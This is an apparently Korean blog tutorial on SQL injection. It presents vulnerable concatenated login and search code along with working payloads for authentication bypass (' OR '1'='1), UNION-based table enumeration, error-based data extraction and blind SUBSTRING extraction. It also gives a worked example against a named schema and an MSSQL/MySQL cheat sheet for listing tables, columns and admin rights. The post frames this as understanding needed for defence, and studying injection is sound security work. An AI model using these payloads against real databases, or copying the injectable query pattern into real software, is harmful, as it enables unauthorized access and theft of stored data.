---
title: "SQL Injection (1)"
date: "2013-08-13"
categories: 
  - "hacking"
tags: 
  - "sql"
  - "sql-injection"
---

# SQL Injection

## 정의

SQL Injection란 명칭그대로 **SQL**을 주입하는 공격이다. 임의의 SQL 구문을 주입하여 해당 SQL문이 본래 의도와는 다른 동작을 하게 만든다. 이에따라 인증을 통과하기도 하고 정보를 조작하거나 유출할 수도 있다. 더 심각한 경우에는 서버전체를 장악당할 수 있다. 이것은 웹프로그램, 응용프로그램 어디서든 발생 될 수 있고 MSSQL, Oracle, MySQL등 모든 DBMS상에서 발생 될 수 있다.

## 개요

SQL Injection 방지하기위한 대처법(_따옴표(')처리, 에러페이지숨김등_)은 임시방책일뿐이며 이것은 결국 다른 공격 방법으로 뚤린 가능성이 많다. 이를 근본적으로 막으려면 SQL Injection 대해 정확히 이해하는 것이 중요하다.

SQL Injection 이라는것을 정확히 이해하는데는 직접 시도해보는 것이 가장 이해가 빠를 것이다.

## 서론

SQL Injection은 어떻게 이루어질까? 간단한 인증우회 방법을 가지고 설명해보겠다.

아래와 같이 로그인인증을 검증하는 코드가 있다고 가정해보자.

```
int check = db.query("SELECT COUNT(*) FROM Member WHERE userid='" + userid + "' AND password='" + password + "'");
if (check == 0) {
    // 로그인 실패
     //...
} else {
    // 로그인 성공
     //...
}
```

입력한 아이디(userid)와 비밀번호(password) 에 해당하는 Member가 있는지 체크하는 SQL 구문을 가진 코드이다.

정상적인 경우, 아이디를 _admin_ 비밀번호를 _1212_ 라고 입력했다고 하면

저 SQL구문은 이렇게 실행된다.

```
SELECT COUNT(*) FROM Member WHERE userid='admin' AND password='1212'
```

admin 아이디에 1212 라는 비밀번호를 가진 Member가 있다면 1을 반환하여 로그인에 성공 할 것이고 없다면 실패할 것이다.

하지만 이른 정상적인 경우가 아닌 아이디를 _admin_ 비밀번호를 _' OR '1'='1_ 라고 입력하면 어떻게 될까?

SQL구문은 이렇게 실행된다.

```
SELECT COUNT(*) FROM Member WHERE userid='admin' AND password='' OR '1'='1'
```

이것은 _OR '1'='1'_ 이 조건 때문에 항상 1이상을 반활 할 것이고 결국은 항상 로그인에 성공 할 것이다.

이런식으로 SQL문에 _' OR '1'='1_와 같은 임의의 SQL구문을 주입함으로써 원래 의도와 다르게 동작하게 되는것을 **SQL Injection** 이라한다.

## 쿼리유추

SQL을 삽입해서 원하는데로 동작하게 하려면 쿼리를 유추하는 것이 중요하다.

예를들어 검색기능이 있는 게시판이 있다고 가정해보자.

검색을 하는 쿼리를 대략 유추를 해보면

```
var collection = db.query("SELECT Subject?, Name?, Created? FROM Board? WHERE Subject LIKE '%" + keyword + "%'");
```

이런식의 쿼리를 유추할 수 있겠다. 물론 컬럼명과 테이블명은 그냥 추측만 할뿐이고 페이징구문, 정렬구문등이 더 들어갈것이다.

추측한 쿼리가 실행된다고 가정하고 검색어 _keyword_ 변수값을 이용하여 SQL을 조작해보자.

keyword 에 _' UNION SELECT '2000', '2000', '2000' WHERE '%'='_ 을 넣는다면

```
SELECT Subject?, Name?, Created? FROM Board? WHERE Subject LIKE '%' UNION SELECT '2000', '2000', '2000' WHERE '%'='%'
```

이렇게 SQL문이 구성이 될 것이고 추측한 쿼리가 맞다면 UNION 구문에 의하여 2000, 2000, 2000 이라는 row가 더 추가되서 검색될 것이다.

UNION을 구문을 실행하기위해 컬럼수를 알아내는 것은 상당한 노가다가 필요하다.. (이것은 간단한 프로그래밍으로 자동화 할 수도 있을것이다)

여기선 '2000' 이라는 단순 문자열을 조회했지만 아래와같이 만든다면 테이블목록, 컬럼목록, 테이블조회등 다양한 정보를 조회 할 수 있다. 이말은 곧 **테이블목록->컬럼목록->데이터조회** 순으로 디비내에 모든 정보를 조회 할 수 있다는 말이 된다.

```
-- MSSQL 기준쿼리 dbo.sysobjects를 SELECT하여 테이블목록을 조회
SELECT Subject?, Name?, Created? FROM Board? WHERE Subject LIKE '%' UNION SELECT name, '2000', '2000' FROM dbo.sysobjects WHERE xtype = 'U' AND '%'='%'
```

## 에레메세지를 이용한 정보 추출

에러페이지에서 알려주는 SQL구문 에러메세지는 SQL Injection시 편한 조회 도구로 활용된다. (_이 때문에 프로그램을 구성할때 에러페이지는 꼭 별도로 구성해야하며 SQL구문 오류는 절대 출력해선 안된다._)

SQL 에러메세지가 SQL Injection시 어떻게 사용되는지 확인해보자.

아래의 에러페이지는 ASP.NET(ASP) 에서 출력해주는 기본 에러화면이다. 아른 언어들도 비슷한 에러화면을 출력해준다.

```
Microsoft OLE DB Provider for SQL Server 오류 '80040e14'

줄 1: '1' 근처의 구문이 잘못되었습니다.

/member/login_ok.asp, 줄 9
```

**쿼리유추**에서는 UNION 을 삽입하여 원하는 정보를 추가적으로 SELECT하였다. 하지만 컬럼수마추기도 쉽지않고 페이징, 정렬, 그룹집계등 복잡한 쿼리에 추측만으로 SQL를 삽입하는건 많은 시간이 소요된다.

SQL 에러메세지를 이용하면 좀 더 쉽게 조회 할 수 있다. 원하는 결과값에 형변환, 형비교 오류등 일부러 SQL 에러를 발생시켜 결과값을 노출시킨다.

```
var collection = db.query("SELECT Subject?, Name?, Created? FROM Board? WHERE Subject LIKE '%" + keyword + "%'");
```

이 SQL구문에서 keyword 값을 _' AND 0 <> (SELECT TOP 1 name FROM FROM dbo.sysobjects WHERE xtype = 'U') AND '%'='_ 이라고 넣는다면 이 SQL문은

```
0 <> (SELECT TOP 1 name FROM FROM dbo.sysobjects WHERE xtype = 'U')
```

이 구문에 의해서 의도된 형비교에러를 발생시킨다.

```
Microsoft OLE DB Provider for SQL Server 오류 '80040e14'

줄 1: 'Member' 를 int형으로 변환할 수 없습니다.

/member/login_ok.asp, 줄 9
```

이 에러메세지는 결과적으로

```
--MSSQL 테이블조회쿼리
SELECT TOP 1 name FROM dbo.sysobjects WHERE xtype = 'U'
```

이 구문을 실행해서 조회해준꼴이 된다.

## Blind SQL Injection

에러메세지를 확인 할 수 없을 경우 오로지 조건의 TRUE/FALSE를 판단하여 데이터를 추출한다. 예를 들어 이런식이다. Condition을 통한 결과값 True/False

```
--Mssql기준

--테이블 조회
SUBSTRING((SELECT TOP 1 name FROM dbo.sysobjects WHERE xtype = 'U'),1,1) = 'a'

--컬럼 조회
SUBSTRING((SELECT TOP 1 name FROM dbo.syscolumns WHERE xtype = 'U' AND OBJECT_ID('테이블')),1,1) = 'a'

--Mysql기준
#--테이블 조회
SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '데이터베이스' LIMIT 1),1,1) = 'a'

#--컬럼 조회
SUBSTRING((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '데이터베이스' AND table_name = '테이블' LIMIT 1),1,1) = 'a';
```

## 에러페이지

```
select top 10 id, name, created from Member where ClientComp_id=13
union
select '2000', '2000', '2000' where '%'='%'
union
select 
char(50)+char(48)+char(48)+char(48),
char(50)+char(48)+char(48)+char(48),
char(50)+char(48)+char(48)+char(48)
```

## 실제 예제

```
SELECT [컬럼들] 
FROM [테이블] 
WHERE 컬럼 LIKE '%[조건]%';

@' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '1'='%

SELECT [컬럼들]
FROM [테이블]
WHERE 컬럼 LIKE '%@' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '1'='%';

SELECT [컬럼들] 
FROM [테이블] 
WHERE 컬럼='[조건]';

'='' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '

SELECT [컬럼들]
FROM [테이블]
WHERE 컬럼 = '' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '';
```

* * *

## 주요 함수

SQL Inejction 기법을 살펴보기 앞서 몇가지 SQL함수를 보도록하자.

Mssql 기본 함수및 쿼리

```
--유저 조회
SELECT db_user();

--데이터베이스 조회
SELECT db_name();

--테이블 목록
SELECT name FROM dbo.sysobjects WHERE xtype = 'U';

--컬럼 목록
SELECT name FROM dbo.syscolumns WHERE id = OBJECT_ID('테이블명');

--컬럼 데이터 값
SELECT 1 WHERE 0 <> (SELECT TOP 1 CAST(컬럼명 AS VARCHAR(8000)) FROM 테이블)

--테이블 조회 (페이징)
SELECT TOP 1 * FROM (SELECT TOP 1 * FROM dbo.sysobjects WHERE xtype = 'U' ORDER BY name ASC) T ORDER BY name DESC
SELECT name FROM(SELECT *,ROW_NUMBER() OVER(ORDER BY name ASC) AS num FROM dbo.sysobjects WHERE xtype = 'U') T WHERE num = 3

--컬럼 조회 (페이징)
SELECT TOP 1 * FROM (
SELECT TOP 10 CAST(컬럼명  AS VARCHAR(8000)) col FROM 테이블
) T ORDER BY col DESC
SELECT name FROM (SELECT *,ROW_NUMBER() OVER(ORDER BY name ASC) AS num FROM dbo.syscolumns WHERE id = OBJECT_ID('Admin_Log')) T WHERE num = 3

--관리자 권한 조회
SELECT IS_SRVROLEMEMBER('sysadmin'); -- sysadmin，dbcreator，diskadmin，processadmin，serveradmin，setupadmin，securityadmin

--데이터베이스 권한
SELECT IS_MEMBER('유저');

--문자열 함수
SELECT SUBSTRING('문자열', pos, count); -- 부분문자열
SELECT LEN('문자열'); -- 문자열길이
SELECT CHAR(아스키코드); -- 코드 to 문자열
```

그밖에 주요 SQL함수

Mysql 기본 함수및 쿼리

```
#--유저 조회
SELECT user();

#--데이터베이스 조회
SELECT database();

#--테이블 목록
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '데이터베이스명';

#--컬럼 목록
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '데이터베이스명' AND table_name = '테이블명';

#--문자열 함수
SELECT SUBSTRING('문자열', pos, count); -- 부분문자열
SELECT LENGTH('문자열'); -- 문자열길이
SELECT CHAR(아스키코드); -- 코드 to 문자열
```
